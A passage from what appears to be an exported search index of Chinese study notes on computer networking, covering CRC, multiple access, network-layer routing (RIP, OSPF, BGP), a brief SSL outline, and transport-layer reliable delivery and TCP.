string of bits using a chosen polynomial. initial_filler should be \u0026#39;1\u0026#39; or \u0026#39;0\u0026#39;. \u0026#39;\u0026#39;\u0026#39; G, d = G.lstrip(\u0026#39;0\u0026#39;), len(D) DR = [int(i) for i in (D + init * (len(G) - 1))] while 1 in DR[:d]: pos = DR.index(1) for i in range(len(G)): DR[pos + i] ^= int(G[i]) return \u0026#39;\u0026#39;.join(DR)[d:]   description graph: (padding pattern graph and generation flow)\nGiven: D=11010011101100, G=1011\r11010011101100 000 \u0026lt;--- input right padded by 3 bits\r1011 \u0026lt;--- divisor\r01100011101100 000 \u0026lt;--- result (note the first four bits are the XOR with the divisor beneath, the rest of the bits are unchanged)\r1011 \u0026lt;--- divisor ...\r00111011101100 000\r1011\r00010111101100 000\r1011\r00000001101100 000 \u0026lt;--- note that the divisor moves over to align with the next 1 in the dividend (since quotient for that step was zero)\r1011 (in other words, it doesn't necessarily move one bit per iteration)\r00000000110100 000\r1011\r00000000011000 000\r1011\r00000000001110 000\r1011\r00000000000101 000\r101 1\r-----------------\r00000000000000 100 \u0026lt;--- remainder (3 bits). Division algorithm stops here as dividend is equal to zero.\r  国际标准已经定义了 8、16、32 比特的生成多项式 G，CRC-32 的标准被多种链路级的 IEEE 采用\n  使用的一个生成多项式为：$$G_{CRC-32} = 0x04C11DB7$$\n  其生成多项式为：$$x^{{32}}+x^{{26}}+x^{{23}}+x^{{22}}+x^{{16}}+x^{{12}}+x^{{11}}+x^{{10}}+x^{8}+x^{7}+x^{5}+x^{4}+x^{2}+x+1$$\n  多路访问链路和协议 #  多路访问问题（multiple access problem）：如何协调多个发送和接收结点对一个共享信道的访问。\n多路访问协议（multiple access protocol）：信道划分协议（channel partitioning protocol）、随机接入协议（random access protocol）和轮流协议（taking-turns protocol）\n碰撞（collide）：所有结点可以同时传输帧，多个结点可能会同时传输帧，所有结点同时接收到多个帧，导致没有一个结点能够有效地获得任何传输的帧。\n信道划分协议 #  能够用于所有共享信道结点之间划分广播信道带宽技术：\n 时分多路复用（TDM）：按时间复用； 频分多路复用（FDM）：按频率复用： 码分多址（Code Division Multiple Access, CDMA）：给每个结点分配一种不同的编码。  随机接入协议 #  一个传输总是以信道的全部速率进行发送，当有碰撞时，随机等待一个延时后，重新发送。\n  时隙 ALOHA\n  载波侦听多路访问 (Carrier Sense Multiple Access, CSMA)：\n  两个重要的原则：\n 说话之前先听； 如果与他人同时开始说话，停止说话；    该协议加入了载波侦听 (carrier sense) 规则，即在发送信号之前侦听信道是否空闲。\n  端到端信号传播时延 (channel propagation delay) 在决定其性能方面起决定性的作用。\n    具有碰撞检测 (collision detection) 的载波侦听多路访问 (CSMA/CD)：\n 在 CSMA 的基础上，当某节点检测到碰撞时将立即停止传输，随机等待一个时间延迟后重新传输 以太网以及 DOCSIS 电缆网络多路访问协议 [DOCSIS 2011] 使用了二进制指数后退（binary exponential backoff）算法：对于经历了 n 此碰撞的帧，随机地从 $${0, 1, 2, \u0026hellip;, 2^n-1}$$ 中选择一个数作为时间间隔进行等待。    具有碰撞避免的载波侦听多路访问（CSMA/AD）。\n  轮流协议 #  "},{"id":207,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"网络层","section":"3.网络层","content":" 学习地址：\n 《计算机网络 自顶向下方法》 原书地址：https://www.net.t-labs.tu-berlin.de/teaching/computer_networking/   网络层 #  概念 #  转发和路由选择 #  网络层的作用从表面上看极为简单，需要两种重要的网络层功能：\n 转发：当一个分组到达路由器的一条输入链路时，路由器必须将该分组移动到合适的输入链路。 路由选择：当分组发送方流向接收方时，网络层必须决定这些分组所采用的路由或路径。计算这些路径的算法被称作路由选择算法（routing algorithm）。  转发表（forwarding table）：\n 路由器通过检查到达分组首部字段的值来转发分组，然后使用该值在路由器的转发表中索引查询。  网络服务模型 #  网络服务模型（network service model）定义了分组在发送与接收端系统之间的端到端运输特性：\n 一个分组的需求特性：  确保交付：该服务确保分组将最终到达其目的地。 具有时延上界的确保交付：在特定的时延上限内交付（如 100ms）   分组流需要提供下列服务：  有序分组交付：确保分组以它们发送的顺序到达目的地。 确保最小带宽：只要发送主机低于给定比特率的速率传输比特，则满足 确保交付 和 在时延上界内确保交付 的特性。 确保最大时延抖动：确保位于发送方发送两个相继分组之间的时间量等于目的地接收到它们之间的时间量 安全性服务：使用仅由源和目的主机所知晓的一个秘密回话密钥。    下面表格给出了三种服务模型：\n   网络体系结构 服务模型 带宽保证 无丢包保证 有序 定时 拥塞指示     因特网 尽力而为 无 无 任何可能 不维护 无   ATM CBR 保证恒定速率 是 有序 维护 不出现拥塞   ATM ABR 保证最小速率 无 有序 不维护 提供拥塞指示    虚电路和数据包网络 #  仅在网络层提供连接服务的计算机网络称为虚电路网络（Virtual-Circuit VC）。\n仅在网络层提供无连接服务的计算机网络称为数据报网络（datagram network）。\nInternet 是数据报网络。\n路由器的工作原理 #  一台路由器主要由以下 4 个部分组成：\n输入端口 #  输入端口通过以下方式进行处理：\n假定转发表已经存在，从概念上来讲表查找是简单的，即我们只是搜索转发表查找最长前缀匹配。\n交换结构 #  主要有三种交换方式：\n输出端口 #  输出端口通过以下方式处理：\nWhere Does Queueing Occur? #  假定需要路由器缓存来吸收流量负载的波动，一个自然而然的问题就是需要多少缓存。\n对于缓存长度的经验方法是：\n 缓存数量（B）应该等于平均往返延时（RTT）乘以链路的容量（C），即 $$B = RTT \\cdot C$$ 有理论和试验研究表明，当有大量的 TCP 流（N）通过一个链路时，缓存所需要的的数量是 $${\\displaystyle B = \\frac{RTT \\cdot C}{\\sqrt{N}} }$$  输出端口排队的后果就是，在输出端口上的一个分组调度程序（packet scheduler）必须在这些排队的分组中选择一个来发送：\n 这种选择可能是根据简单的原则来定，如先来先服务（FCFS）调度。 或者更加复杂的调度规则，如加权公平排队（WFQ）  类似的，如果没有足够的内存来缓存一个入分组，那么必须丢弃一些分组。已经提出了许多分组丢弃和标记的策略，这些策略统称为主动队列管理（Active Queue Management, AQM）算法：\n  随机早期检测（Random Early Detection, RED）算法是一种得到最广泛研究和实现的 AQM 算法：\nvoid newPacket(Packet p){ if (queue.length \u0026lt; min_val) queue.push_back(p); else if (queue.length \u0026gt; min_val \u0026amp;\u0026amp; queue.length \u0026lt; max_val){ if(randF(queue.length, min_val, max_val)) drop p; else queue.push_back(p); }else drop p; } 其中：min_val 和 max_val 是给定的阈值，randF 按照一定概率返回 true 的函数。\n  如果交换结构不能快得是所有到达分组无延时地通过它传送，则在输入端口也将出现分组排队，因为到达的分组必须加入输入端口队列中，以等待通过交换结构传送到输出端口。\n这种现象叫做输入排队交换机中的线路前部阻塞（Head-Of-the-Line, HOL），即在一个输入队列中排队的分组必须等待通过交换结构发送（即使输出端口是空闲的），因为它被位于线路前部的另一分组所阻塞。\n网际协议 #  Internet 的网络层主要有三个主要组件：\n数据报格式 #  网络层的分组被称为数据报，IPv4 的数据报格式如下：\nIP 数据报分片：\n 因为不同的链路层协议拥有不同的 MTU（Maximum Transmission Unit, 一个链路层帧能够承载的最大数据量），我们可能需要将 IP 数据报中的数据分片称多个较小的数据报，用单独的链路层帧封装这些较小的 IP 数据报，然后向输出链路上发送这些帧。每个这些较小的数据报都称做片（fragment）。 为了让目的主机将这些接收到的片拼接到一起以形成初始的数据报，IPv4 的设计者将以下三个字段放在 IP 数据报的首部中：  标志，flag，flag=0 表示这是最后一个片 偏移，offset，表示相对初始位置的偏移，规定为以 8 字节块为单位。 标识号，ID，标识号相同的属于同一片数据。    IPv4 编址 #  子网：\n  在网络拓扑结构中，任意两个路由器或主机的端口之间的部分可以形成一个网络岛，每一个这种网络岛便称为一个子网（subnet）。\n  IP 编址会为子网分配一个地址，比如：223.1.1.0/24，其中 /24 的记法称作子网掩码，他表示 32 位比特中最左侧的 24 比特定义了子网地址。\n  CIDR：因特网的地址分配策略被称为无类别域间路由选择（Classless Inter-domain Routing, CIDR），它将子网寻址的概念一般化了。\n 形式位 a.b.c.d/x 的地址的 x 最高比特构成了 IP 地址的网络部分，并且经常被称作该地址的前缀（prefix，或网络前缀） 一个地址剩余的 32-x 比特可认为是用于区别该组织内部设备的。  在 CIDR 被采用之前，IP 地址的网络部分被限制为长度为 8、16 和 24 比特子网地址的子网分别被称为 A、B 和 C 类网络。\n获取一块地址 #   网络管理员与 ISP(Internet Service Provider) 联系，该 ISP 会从已经分给它的更大的地址块中提供一些地址。 向 ICANN(Internet Corporation for Assigned Names and Numbers) 提起申请（基于 [RFC 2050]）  PostScript：ICANN 除了管理 IP 地址外，还管理 DNS 根服务器，还负责分配域名与解决域名纷争。\n获取主机地址 #  某组织一旦获得了一块地址，它就可以为本组织内的主机与路由器接口逐个分配 IP 地址。\n主机地址可以手动配置，也可以通过 DHCP(Dynamic Host Configuration, DHCP) 来完成。\nDHCP：\n  DHCP 允许主机自动获取（被分配）一个 IP 地址，主机还可以得知子网掩码、第一跳路由器（或称默认网关）与它的本地 DNS 服务器地址等。\n  网络管理员可以配置 DHCP，以使某给定的主机每次与网络连接时能得到一个相同的 IP 地址，或者某主机将被分配一个临时的 IP 地址。\n  DHCP 是一个客户-服务器协议，它工作流程如下：\n DHCP 服务器发现：新到来的主机以发送 DHCP 发现报文 广播信号。 DHCP 服务器提供：DHCP 收到一个发现报文后，使用 DHCP 提供报文 广播信号进行响应。 DHCP 请求：新到达的客户从一个或多个服务器提供中选择一个并向选中的服务器提供一个 DHCP 请求报文 进行响应。 DHCP ACK：服务器用 DHCP ACK 报文 证实所要求的参数。    因特网控制报文协议 #  因特网控制报文协议（ICMP）是被主机和路由器用来彼此沟通网络层信息的协议。它最典型的用途就是差错报告。ICMP 报文有一个类型字段和一个编码字段，并且包含引起该 ICMP 报文首次生成的 IP 数据报的首部和前 8 字节内容。\n应用 ICMP 的两个程序：ping，traceroute\n路由选择算法 #  主机通常直接与第一台路由器相连，该路由器即为主机的默认路由器（default router），又称作该主机的第一跳路由器（first-hop router）。我们把源主机的默认路由器称作源路由器（source router），目的主机的默认路由器称作目的路由器（destination router）。\n那么路由选择算法：\n 给定一组路由器以及连接路由器的链路，找到一条从源路由器到目的路由器的最低消耗路径。\n 链路状态选择算法 #  全局式路由选择算法（global routing algorithm）用完整的、全局性的网络知识计算出从源到目的地之间的最低费用路径：以所有节点之间的连通性以及链路的费用作为输入。\n实践中，具有全局状态信息的算法常被称作链路状态算法（Link State, LS），经常由链路状态广播（link state broadcast）实现（比如 OSPF 路由选择协议），使用 Dijkstra 算法，计算结果给出如下两个变量：\n D(v): cost of the least-cost path from the source node to destination v as of this iteration of the algorithm. p(v): previous node (neighbor of v) along the current least-cost path from the source to v.  通过 p(v) 即可构造从源路由出发到目的路由 v 的路径。\n距离向量路由算法 #  分散式路由选择算法（decentralized routing algorithm）以迭代、分布式的方式计算出最低费用路径。没有结点拥有关于所有网络链路费用的完整信息，而每个结点仅有与其直接相连链路的费用知识即可开始工作。\n距离向量算法（Distance-Vector, DV）是一种迭代的、异步的和分布式的算法。\nPreScript：首先给出下面的一个方程：\n Bellman-Ford 方程：$${\\displaystyle d_x(y) = min_{v\\in neighbor(x)}{c(x,v), +d_v(y)} }$$，其中 $$d_x(y)$$ 是从结点 x 到 y 的最低费用\n 在 DV 算法中，每个结点拥有以下的三个路由信息：\n  For each neighbor v, the cost c(x,v) from x to directly attached neighbor, v\n  Node x’s distance vector, that is, $$D_x = [D_x(y): y \\in N]$$, containing x’s estimate of its cost to all destinations, y, in N\n  The distance vectors of each of its neighbors, that is, $$D_v = [D_v(y): y \\in N]$$ for each neighbor v of x\n  然后利用 Bellman-Ford 方程，可以得到到目的地址的距离向量。\n链路费用改变与链路故障 #  当运行 DV 算法的结点检测到从它自己到邻居的链路费用发生变化时，他就更新其距离向量，并且如果最低费用发生了变化，向邻居通知其新的距离向量。\n一个问题：遇到选择环路 → 无穷计数问题。\n增加毒性逆转 #  避免无穷计数问题：一种称为毒性逆转（poisoned reverse）的技术：\n 如果 z 通过 y 路由发送一个目的地为 x 的数据报，则 z 将通告 y，它到 x 的距离是正无穷，因此 y 在进行路由选择时永远不会选择经由 z 到 x，从而避免了路由选择环路问题。  局限性：涉及三个或更多结点而不只是两个直接相连的邻居结点的环路问题将无法使用毒性逆转技术检测。\n层级路由选择 #  以上的两个算法在实际应用中会出现 规模 和 管理自治 这两个重要问题。\n都可以通过将路由器组织进 自治系统（Autonomous System, AS）来解决，每个 AS 由一组通常处在相同管理控制下的路由器组成：在相同的 AS 中的路由器都全部运行同样的路由选择算法。\n在一个自治系统内运行的路由选择算法叫做 自治系统内部路由选择协议（intra-autonomous system routing protocol）。\n有一台或多台负责向在本 AS 之外的目的地转发分组的路由器，被称作 网关路由器（gateway router）。\n因特网中的路由选择 #  RIP 协议 #  RIP 协议是一种 AS 内部的路由选择协议，又称作内部网关协议（interior gateway protocol）。AS 内部路由选择协议用于确定在一个 AS 内执行路由选择的方式。\nRIP 是一种距离向量协议，在 [RFC 1058] 中定义的 RIP 版本使用跳数作为其费用测度，即每条链路的费用为 1。\nRIP 中一条路径的最大费用被限制为 15，因此 RIP 的使用限制在网络直径不超过 15 跳的自治系统内。\n路由选择更新信息在邻居之间通过一种 RIP 响应报文（RIP response message）来交换，大约每 30 秒相互交换一次，一台路由器或主机发出的响应报文包含了一个该 AS 内的多达 25 个目的的子网列表，以及发送方到每个子网之间的距离。响应报文又称作 RIP 通告（RIP advertisement）。\n每台路由器维护一张称为路由选择表（routing table）的 RIP 表。\nOSPF 协议 #  OSPF 协议也是一种 AS 内部的路由选择协议。\nOSPF 协议（与 IS-IS 协议）通常都设置在上层 ISP 中，而 RIP 通常设置在下层 ISP 和企业网中。\nOSPF 协议的核心是一个使用洪泛链路状态信息的链路状态协议和一个 Dijkstra 最低费用路径算法。\n使用 OSPF 时，路由器向自治系统内所有其他路由器广播路由选择信息，而不仅仅向其相邻路由器广播。每当一条链路的状态发生变化时，路由器就会广播链路状态信息。即使链路状态未发生变化。它也要周期性地（至少每隔 30 分钟一次）广播链路状态。OSPF 协议还要检查链路正在运行（通过向相连的邻居发送 HELLO 报文），并允许 OSPF 路由器获得相邻路由器的网络范围链路状态的数据库。\nOSPF 协议有以下优点：\n 安全：能够鉴别 OSPF 路由器之间的交换。使用鉴别，仅有受信任的路由器能参与一个 AS 内的 OSPF 协议。 多条相同费用的路径：OSPF 允许使用多条路径。 对单播与多播路由选择的综合支持：多播 OSPF（MOSPF）提供对 OSPF 的简单扩展。 支持在单个路由选择域内的层次结构：最重要的优点。  BGP 协议 #  BGP(Border Gateway Protocol) 协议是是一种 AS 间的路由选择协议。\nBGP 为每个 AS 提供了进行以下工作的手段：\n 从相邻 AS 出获得子网可达性信息； 向本 AS 内部的所有路由器传播这些可达性信息； 基于可达性信息和 AS 策略，决定到达子网的 “好” 路由。  BGP 基础 #  在 BGP 中，路由器对通过使用 179 端口的半永久 TCP 连接来交换路由选择信息：\n 位于连接端点的两台路由器称为 BGP 对等方（BGP peers） 沿着连接发送所有 BGP 报文的 TCP 连接称为 BGP 会话（BGP sessions） 跨越两个 AS 的 BGP 会话称为 外部 BGP 会话（external BGP session, eBGP） 在同一个 AS 内部的 BGP 会话称为 内部 BGP 会话（internal BGP session, iBGP）  BGP 使得每个 AS 知道经过其相邻的 AS 可达哪些目的地（CDIR 化的前缀（prefix））\n路径属性和 BGP 路由 #  在 BGP 中，一个 AS 由其全局唯一的自治系统号（Autonomous System Number, ASN）所标识，由 ICANN 地区注册机构分配。\n当一台路由器通过 BGP 会话通告一个前缀时，它在前缀中包含一些 BGP 属性（在 BGP 术语中，带有属性的前缀被称为一条路由（route））两个较为重要的属性：\n  AS-PATH：该属性包括了前缀通告已经通知过的那些 AS。当一个前缀通告传送到一个 AS 时，该 AS 将它的 ASN 增加到 AS-PATH 属性中。\n  NEXT-HOOP：The NEXT-HOP is the router interface that begins the AS-PATH. 即相邻 AS 网关路由器之间的 IP 地址。\n  BGP 的路由选择 #  如果对相同前缀存在两条或多条路由，则 BGP 顺序地调用下面的消除规则，直到留下一条路由：\n 路由被指派一个本地偏好值作为他们的属性之一，具有最高本地偏好值的路由将被选择。 在余下的路由中，具有最短 AS-PATH 的路由将被选择。 在余下的路由中，具有最靠近 NEXT-HOOP 的路由将被选择。 如果仍剩下多条路由。使用 BGP 标识符来选择路由。  "},{"id":208,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/ssl/","title":"Ssl","section":"4.传输层","content":" 学习网址：\n https://www.cnblogs.com/bhlsheji/p/4586597.html   SSL #  协议工作过程 #  分层结构 #  SSL 位于应用层和传输层之间，它能够为不论什么基于 TCP 等可靠连接的应用层协议提供安全性保证。SSL 协议本身分为两层：\n  上层为 SSL 握手协议 (SSL handshake protocol)、SSLpassword 变化协议 (SSL change cipher spec protocol) 和 SSL 警告协议 (SSL alert protocol)。\n  底层为 SSL 记录协议 (SSL record protocol)。\n  当中：\n  SSL 握手协议：是 SSL 协议很重要的组成部分。用来协商通信过程中使用的加密套件(加密算法、密钥交换算法和 MAC 算法等)、在 server 和 client 之间安全地交换密钥、实现 server 和 client 的身份验证。\n  SSLpassword 变化协议：client 和 server 端通过 password 变化协议通知对端。随后的报文都将使用新协商的加密套件和密钥进行保护和传输。\n  SSL 警告协议：用来向通信对端报告告警信息，消息中包括告警的严重级别和描写叙述。\n  SSL 记录协议：主要负责对上层的数据 (SSL 握手协议、SSLpassword 变化协议、SSL 警告协议和应用层协议报文) 进行分块、计算并加入 MAC 值、加密。并把处理后的记录块传输给对端。\n  SSL 握手过程 #  SSL 通过握手过程在 client 和 server 之间协商会话參数，并建立会话。会话包括的主要參数有会话 ID、对方的证书、加密套件（密钥交换算法、数据加密算法和 MAC 算法等）以及主密钥（master secret）。通过 SSL 会话传输的数据，都将採用该会话的主密钥和加密套件进行加密、计算 MAC 等处理。\n 仅验证 server 的 SSL 握手过程：   "},{"id":209,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/tcp/","title":"Tcp","section":"4.传输层","content":" 学习网址：\n https://blog.csdn.net/a19881029/article/details/38091243   "},{"id":210,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/%E8%BF%90%E8%BE%93%E5%B1%82/","title":"运输层","section":"4.传输层","content":" 学习地址：\n 《计算机网路，自顶向下的方法》   运输层 #  无连接运输：UDP #  UDP stands for User Data Protocol.\n报文结构 #  UDP 首部只有四个字段，每个字段首部由两个字节组成。\nUDP 的报文段结构如下图所示，它由 RFC 768 定义：\nUDP 校验和 #  伪协议头：\n 用于计算 checksum 包括源 IP 地址和目的 IP 地址。  NOTICE：\n  UDP 校验和是可选项，IPv6 中将变成强制性的（UDP 校验和覆盖的范围超出了 UDP 数据报本身）\n  使用伪首部的目的是检验 UDP 数据报是否真正到达目的地。正确的目的地包括了特定的主机和该主机上特定的端口\n  伪首部不随用户数据报一起传输\n  接收方需自己形成伪首部进行校验\n  伪首部的使用破坏了层次划分的基本前提，即每一层的功能独立\n  目的主机的 IP 地址 UDP 通常知道，源 IP 的使用需要通过路由选择决定\n  可靠信息传输原理 #  可靠数据传输协议：reliable data transfer protocol\n构造可靠信息传输协议 #  经完全可靠信道的可靠数据传输 rdt 1.0 #  发送方和接收方的有限状态机（Finite-State Machine, FSM）如下：\n经具有比特差错信道的可靠数据传输 rdt 2.0 #  我们引入自动重传请求（Automatic Repeat reQuest, ARQ）协议，主要加入了以下的三种功能：\n 差错检查：需要一种机制以使接收方检测到合适出现了比特差错； 接收方反馈：引入了接收到方回答的 “肯定确认”（ACK）和 “否定确认”（NAK），理论上，这些分组只需要一个比特长：如 0 表示否定，1 表示肯定。 重传：接收方受到由差错的分组时，发送方将重传该分组。  rdt 2.0 的 FSM 如下：\n可见发送方存在一个等待回答的状态，所以 rdt2.0 又称作 “停等（stop-and-wait）协议”。\n但是，rdt2.0 存在一个致命缺陷：它没有考虑 ACK 和 NAK 分组受损的情况，我们提出以下三种解决方法：\n 发送方收到来自接收方的损坏 ACK 或 NAK 的请求再次发送。但是如果该包也在传输过程中受损的话，逻辑就陷入了死循环。 增加足够的校验比特位，使得发送方不仅可以检测差错，还可以恢复差错。 当发送方收到含糊不清的 ACK 或 NAK 分组时，只需重传当前数据分组即可。  然而这种方法在发送方和接收方的信道中引入了 冗余分组（duplicate packet），解决这一问题的一个简单方法是：让发送方对其数据分组进行编号，即添加序号（sequence number）字段，接收方则只需要检查序号来判断是否为一次重传。    rdt2.1 的 FSM 如下（注意到发送方每次发送仅与 当前分组 和 前一分组 有关，所以只需要两个序列状态）：\nrdt2.2 通过更改包装函数，在 ACK 中加入了对应的序列号信息，其 FSM 如下（发送方关键在 isACK(rcvpkt, 0) 与 isACK(rcvpkt, 1)，接收方关键在 has_seq0 与 has_seq1）：\n经具有比特差错和丢包信息信道的可靠数据传输 rdt 3.0 #  我们使用一个基于时间的重传机制来解决丢包问题，需要一个倒数计数定时器（countdown timer），在一个给定的时间量过期后，可中断发送。因此发送方的工作流程大致如下：\n 每次发送一个分组（包括第一次分组和重传分组）时，便启动一个计时器； 相应计时器中断（采取适当的动作） 终止计时器  因为分组序号在 0 和 1 之间交替，因此 rdt3.0 有时又被称作比特交替协议（alternating-bit protocol），其 FSM 如下：\n流水线可靠数据传输协议 #  rdt3.0 是一个功能正确的协议，但并非人人对它的性能满意，它性能的核心在于他是一个停等协议。这种协议的发送方信道利用率（$${\\displaystyle U_{sender} = \\frac{L/R}{RTT + L/R}, where\\ R \\Rightarrow sendrate, L \\Rightarrow datalength}$$）极低。\n因此许多协议采用一种技术，数据流可以被看成是填充到一条流水线中，故这种技术被称作流水线（pipelining），它对可靠数据传输协议带来如下影响：\n  必须增加序列号的范围；\n  发送方和接收方两端也许必须缓存多个分组；\n  一个如何处理丢失、损坏以及延时过大分组的方法。\n解决流水线的差错恢复有两种基本方法：回退 N 步（Go-Back-N, GBN）和选择重传（Selective Repeat, SR）。\n  回退 N 步 #  我们定义：\n  窗口大小（windows size） N：GBN 协议中，未确认分组数不能超过的某个最大允许数目。\n  基序号（base）：最早的未确认分组的序号；\n  下一序号（nextseqnum）：最小的未使用序号（即 下一个待发送的分组）\n  那么，可以将序号范围划分为以下的四个部分：\n  因为 N 的滑动窗口的存在，GBN 通常又被称作滑动窗口协议（sliding-windows protocol）\n  在实践中，一个分组的序号存放在分组的首部一个固定的字段（长度为 k）中，所有涉及字段的运算都必须使用模 $$2^k$$ 运算。\n  加入变量扩展后，GBN 协议下的 FSM 如下：\nGBN 协议下的发送方必须响应三种类型的事件：\n 上层的调用：当上层调用 rdt_send 时，发送方首先检查发送窗口是否已满，未满则产生一个新的分组将其发送，已满则拒绝请求或缓存数据。 收到一个 ACK：在 GBN 协议中，对序列号为 n 分组的确认采用累计确认（cumulative acknowledgment）的方式：收到序列号为 n 的 ACK $$\\Leftrightarrow$$ 接收方正确接收到序号为 n 以及小于 n 的所有分组。 超时事件：如果出现超时，发送方将重传所有已发送但还未被确认过的分组。  Notice：接收方会丢弃所有的失序分组（因为分组未被确认，所以该分组会被发送发重传一遍）。\n一个 GBN 协议下的示例如下：\n选择重传 #  在 GBN 中，单个分组的差错就会引起 GBN 重传大量分组。那么序列范围将通过以下的方式划分：\nNOTICE：接收方收到重传的数据包后，亦必须回复 ACK。\n因为接收方观察发送方的行为是一个黑盒，所以会出现以下两种情况，对于接收方无法辨认：\n为了避免这种二义性的情况，窗口长度必须小于或等于序列号空间的一半。\n面向连接的运输：TCP #  TCP 连接 #  概念：\n TCP 的链接过程通常被称作三次握手。 最大报文段长度（Maximum Segment Size, MSS）：TCP 可以从缓存中取出并放入缓存中的数据数量。 最大传输单元（Maximum Transmission Unit, MTU）：最大链路层帧长度。  报文结构 #  除了源端口号、目的端口号、检验和字段，TCP 报文首段还包括以下的结构：\n 32 比特的序号字段（sequence number field）和 32 比特的确认号字段（acknowledgment number field）； 16 比特的接收窗口字段（receive window field），该字段用于流量控制； 4 比特的首部长度字段（header length field），指示了以 32 比特的字为单位的 TCP 首部长度。 可选与变长的选项字段（options field），用于协商 MSS。 6 比特的标志字段：ACK、RST、SYN、FIN、URG、PSH。  序号：\n  因为序号是建立在传送的字节流上，而不是建立在传送报文段的序列之上。所以一个报文段的序号是该报文段首字节的字节流编号。\n  比如：一个 MSS 为 1000 字节的数据流，若首字节编号为 0，则第一个报文段分配序号 0，第二个报文段分配序号 1000。\n  确认号：\n 主机 A 填充进报文段的确认号是主机 A 期望从主机 B 收到的下一字节的序号。  在报文无序到达接收端时，TCP 的 RFC 并没有对次操作进行明确的规定，而是把这一问题留给实现编程的人处理，他们有两个基本的选择：\n 接收方立即丢弃失序报文段（这可以简化接收方的设计）； 接收方保留失序的报文，并等待缺少的字节以填补该间隔。  在理论讨论中，我们假设初始序号为 0。事实上，一条 TCP 连接的双方均可以随机地选择初始序号。这样做可以减少那些仍然在网络中存在的来自两台主机之间先前已经终止的连接的报文段，误认为是后来这两台主机新建连接所产生的有效报文的可能性。\n估计往返时间与超时 #  估计往返时间 #  TCP 维持一个 SampleRTT 的均值（称为 EstimatedRTT），一旦获取一个新的 SampleRTT，TCP 就会根据以下的公式来更新 EstimatedRTT：\n$$EstimatedRTT = (1- \\alpha) \\cdot EstimatedRTT + \\alpha \\cdot SampleRTT$$\n在 [RFC 6298] 中给出的 $$\\alpha$$ 参考值是 $$\\alpha = 0.125$$。\n在统计学观点来讲，这种平均叫做指数加权移动平均（Exponential Weighted Moving Average, EWMA）\n另外，[RFC 6298] 中还定义了 RTT 偏差 DevTT，用于估算 SampleRTT 一般会偏离 EstimatedRTT 的程度：\n$$DevRTT = (1-\\beta) \\cdot DevRTT + \\beta \\cdot |SampleRTT - EstimatedRTT|$$\n其中，$$\\beta$$ 的推荐值为 0.25。\n设置和管理重传时间 #  综合了几个方面的考虑（略），TCP 的重传时间通过下面的公式给出：\n$$TimeoutInterval = EstimatedRTT + 4 \\cdot DevRTT$$\n可靠数据连接 #  一些有趣的情况 #  情况一，ACK 丢失时，接收方会收到冗余的数据报，如下图：\n情况二，重传时间设置过短时，会导致在 ACK 到达发送方之前出发重传，如下图：\n情况三，连续发送字节数据时，即使前面的 ACK 丢失，因为累计确认的缘故则不会导致重传，如下图：\n超时间隔加倍 #  大多数 TCP 实现中都会做这样一个参数修改：TCP 重传时，TimeoutInterval 会使用 DevRTT 和 EstimatedRTT 计算出时间的两倍；而当定时器在另外两个事件（收到上层应用的数据和收到 ACK）中的任意一个启动时，TimeoutInterval 则直接使用 DevRTT 和 EstimatedRTT 计算得到的值。\n快速重传 #  发送方可以通过注意接收方发送的冗余 ACK （这是因为 TCP 不使用否定确认）来较好的检测到丢包情况。\n在 [RFC 5681] 中，给出了接收方产生 ACK 的几个建议：\n   Event TCP Receiver Action     Arrival of in-order segment with expected sequence number. All data up to expected sequence number already acknowledged. Delayed ACK. Wait up to 500 msec for arrival of another in-order segment. If next in-order segment does not arrive in this interval, send an ACK.   Arrival of in-order segment with expected sequence number. One other in-order segment waiting for ACK transmission. Immediately send single cumulative ACK, ACKing both in-order segments.\n（用累积 ACK 同时确认缓存和新到达报文段）   Arrival of out-of-order segment with higher-than-expected sequence number. Gap detected. Immediately send duplicate ACK, indicating sequence number of next expected byte (which is the lower end of the gap).   Arrival of segment that partially or completely fills in gap in received data. Immediately send ACK, provided that segment starts at the lower end of gap.    在 [RFC 5681] 中，一旦收到 3 个冗余 ACK，TCP 就会执行快速重传（fast retransmit），即在该报文的定时器过期之前重传丢失的报文。\n流量控制 #  TCP 为它的应用程序提供了流量控制服务以消除发送方使接收方缓存溢出的可能。TCP 通过让发送方维护乐意称为接收窗口（receiver window）的变量来提供流量控制。\n接收窗口用 rwnd 表示，根据缓存可用空间的数量来设置：\n$$rwnd = RcvBuffer - [LastByteRcvd - LastByteRead]$$\n即可以用如下图表示：\n一个问题：TCP 的接收方仅当在它有数据或有确认要发时才会发送报文段给发送方，发送方可能会不知道接收方有新的空间，导致发送方被阻塞而不饿能再发数据。\n为了解决这个问题，TCP 的规范中要求：当主机 B 的接收窗口为 0 时，主机 A 继续发送只有一个字节数据的报文段。这些报文段将会被主机 B 确认，其中会含有一个非 0 的 rwnd 值。\nTCP 连接管理 #  客户端中的 TCP 会用以下的方式与服务器中的 TCP 建立一条 TCP 连接：\n  第一步，发送一个特殊的 TCP 报文段，包括以下特点：\n 不含应用层数据；SYN=1；随机的一个初始序号（client_isn）。  因为 SYN，这个特殊的报文称作 SYN 报文段。\n  第二步，服务器为该 TCP 连接分配 TCP 缓存和变量，并向客户 TCP 发送允许连接的报文段，包括以下特点：\n 不包含应用层数据；SYN=1；ACK=client+1；选择服务器自己的初始序号（server_isn）。  该特殊的报文有时称作 SYNACK 报文段。\n  第三步，客户也要给该连接分配缓存和变量，客户端向服务端发送另外一个报文段，包括以下特点：\n ACK=server_isn+1；SYN=0；可以携带应用层的数据。    具体如下图所示：\nTCP 关闭连接的流程图如二图所示：\n客户端的 FSM 在关闭时如下图所示：\n拥塞控制原理 #  拥塞控制方法 #  我们根据网络层是否为运输层提供了显式的帮助，来区分拥塞控制的方法：\n 